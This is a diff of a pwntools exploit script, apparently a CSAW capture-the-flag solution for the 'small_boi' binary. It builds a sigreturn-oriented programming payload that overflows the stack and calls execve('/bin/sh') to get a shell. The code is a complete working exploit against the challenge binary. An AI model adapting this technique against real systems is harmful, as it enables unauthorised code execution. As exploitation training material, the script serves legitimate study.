@@ -1,31 +1,30 @@
 from pwn import *
 
-r = process("./small_boi")
+# Establish the target
+target = process("./small_boi")
+#gdb.attach(target, gdbscript = 'b *0x40017c')
+#target = remote("pwn.chal.csaw.io", 1002)
 
-#r = remote("localhost", 1337)
+# Establish the target architecture
+context.arch = "amd64"
 
-context.arch = 'amd64'
-padding = 'A' * 40
+# Establish the address of the sigreturn function
+sigreturn = p64(0x40017c).decode("iso-8859-1")
 
-sigrop = 0x400180
-syscall = 0x400185
+# Start making our sigreturn frame
+frame = SigreturnFrame()
 
-#binary = ELF("./sigrop")
-#binsh = binary.symbols['useful_string']
-binsh = 0x4001ca
+frame.rip = 0x400185 # Syscall instruction
+frame.rax = 59       # execve syscall
+frame.rdi = 0x4001ca # Address of "/bin/sh"
+frame.rsi = 0x0      # NULL
+frame.rdx = 0x0      # NULL
 
-s = SigreturnFrame(kernel='amd64')
+payload = "0"*0x28 # Offset to return address
+payload += sigreturn # Function with sigreturn
+payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack
 
-s.rax = constants.SYS_execve
-s.rdi = binsh
-s.rsi = 0
-s.rdx = 0
-s.rip = syscall
+target.sendline(payload) # Send the target payload
 
-
-payload = padding + p64(sigrop) + str(s)
-
-pause()
-r.send(payload)
-
-r.interactive()
+# Drop to an interactive shell
+target.interactive()
